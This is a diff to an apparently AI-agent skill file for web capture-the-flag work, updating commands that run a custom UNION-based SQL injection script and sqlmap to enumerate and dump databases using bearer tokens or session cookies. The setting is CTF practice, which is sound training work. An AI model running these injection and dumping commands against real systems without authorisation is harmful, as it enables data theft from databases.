@@ -20,9 +20,9 @@ with a numbered `UNION SELECT`, and dumps SQLite tables whose name matches a pri
 through that same UNION, stopping the moment a flag shows up:
 
 ```bash
-python ~/.claude/skills/web-ctf/scripts/sqlquick.py --url "<target>/api/search?q=1" --token "$TOKEN"
+python3 ~/.claude/skills/web-ctf/scripts/sqlquick.py --url "<target>/api/search?q=1" --token "$TOKEN"
 # param is inferred when the URL has exactly one query param; otherwise pass --param
-python ~/.claude/skills/web-ctf/scripts/sqlquick.py --url "<target>/api/items?id=1&sort=name" \
+python3 ~/.claude/skills/web-ctf/scripts/sqlquick.py --url "<target>/api/items?id=1&sort=name" \
   --param id --cookie "session=<value>"
 ```
 
@@ -35,14 +35,14 @@ sqlmap run stand as a negative either.
 If `sqlquick.py` misses or you need deeper technique coverage (blind time-based, second-order,
 stacked queries, DB fingerprinting), escalate to sqlmap:
 ```bash
-python /c/Tools/sqlmap/sqlmap.py -u "<target>/api/search?q=test" \
+sqlmap -u "<target>/api/search?q=test" \
   --headers="Authorization: Bearer $TOKEN" --batch --level 2 --risk 2 --dbs \
-  --output-dir /c/Tools/CTF/<challenge-name>/exploits/sqlmap
+  --output-dir ~/Tools/CTF/<challenge-name>/exploits/sqlmap
 
 # cookie auth
-python /c/Tools/sqlmap/sqlmap.py -u "<target>/api/search?q=test" \
+sqlmap -u "<target>/api/search?q=test" \
   --cookie="<name>=<value>" --batch --level 2 --risk 2 --dbs \
-  --output-dir /c/Tools/CTF/<challenge-name>/exploits/sqlmap
+  --output-dir ~/Tools/CTF/<challenge-name>/exploits/sqlmap
 ```
 
 ### Confirm it's interpolation, not a bound parameter
